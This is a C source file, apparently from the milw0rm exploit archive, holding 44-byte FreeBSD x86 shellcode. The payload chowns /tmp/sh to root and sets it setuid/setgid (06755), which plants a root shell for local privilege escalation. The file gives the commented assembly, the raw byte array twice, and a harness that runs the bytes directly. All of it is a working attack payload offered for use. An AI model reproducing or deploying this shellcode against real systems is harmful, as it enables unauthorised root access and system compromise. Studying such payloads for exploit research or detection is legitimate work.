/*
 * FreeBSD shellcode
 * chown("/tmp/sh", 0, 0); chmod("/tmp/sh", 06755);
 * 44 bytes
 *
 * Claes M. Nyberg 20020209
 *
 * <cmn@darklab.org>, <md0claes@mdstud.chalmers.se>
 */

/*************************************************************
void
main(void)
{
__asm__("
          xor      %eax, %eax      # eax = 0
          pushl    %eax            # string ends with NULL
          pushl    $0x68732f2f     # push 'hs//' (//sh)
          pushl    $0x706d742f     # push 'pmt/' (/tmp)
          movl     %esp, %ebx      # ebx = &string[0]
          push     %eax            # 0
          push     %eax            # 0
          push     %ebx            # /tmp/sh
          push     %eax            # Dummy
          mov      $0x10, %al      # eax = 16 = chown
          int      $0x80           # chown(/tmp/sh, 0, 0);
          xor      %eax, %eax      # eax = 0
          or       $0xded, %ax     # eax = 06755
          pushl    %eax            # 06755
          push     %ebx            # /tmp/sh
          pushl    %eax            # dummy
          xor      %eax, %eax      # eax = 0
          mov      $0xf, %al       # eax = 15 = chmod
          int      $0x80           # chmod(/tmp/sh, 06755);
          mov      $0x1, %al       # eax = 1 = exit
		  push     %eax            # exit value = 1
          push     %eax            # Dummy
          int      $0x80           # exit(1);
    ");
}

*************************************************************/

#include <stdio.h>
#include <string.h>

static char freebsd_code[] =
		"\x31\xc0"              /* xor      %eax, %eax  */
		"\x50"                  /* pushl    %eax        */
		"\x68\x2f\x2f\x73\x68"  /* pushl    $0x68732f2f */
		"\x68\x2f\x74\x6d\x70"  /* pushl    $0x706d742f */
		"\x89\xe3"              /* movl     %esp, %ebx  */
		"\x50"                  /* pushl    %eax        */
		"\x50"                  /* pushl    %eax        */
		"\x53"                  /* pushl    %ebx        */
		"\x50"                  /* pushl    %eax        */
		"\xb0\x10"              /* mov      $0x10, %al  */
		"\xcd\x80"              /* int      $0x80       */
		"\x31\xc0"              /* xor      %eax, %eax  */
		"\x66\x0d\xed\x0d"      /* or       $0xded, %ax */
		"\x50"                  /* pushl    %eax        */
		"\x53"                  /* push     %ebx        */
		"\x50"                  /* pushl    %eax        */
		"\x31\xc0"              /* xor      %eax, %eax  */
		"\xb0\x0f"              /* mov      $0xf, %al   */
		"\xcd\x80"              /* int      $0x80       */
        "\xb0\x01"              /* mov      $0x1, %al   */
        "\x50"                  /* push     %eax        */
        "\x50"                  /* push     %eax        */
        "\xcd\x80";             /* int      $0x80       */

static char _freebsd_code[] =
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x74\x6d\x70\x89\xe3\x50"
        "\x50\x53\x50\xb0\x10\xcd\x80\x31"
        "\xc0\x66\x0d\xed\x0d\x50\x53\x50"
        "\x31\xc0\xb0\x0f\xcd\x80\xb0\x01"
        "\x50\x50\xcd\x80";

void
main(void)
{
    void (*code)() = (void *)_freebsd_code;
    printf("strlen code: %d\n", strlen(freebsd_code));
    code();
}

// milw0rm.com [2004-09-26]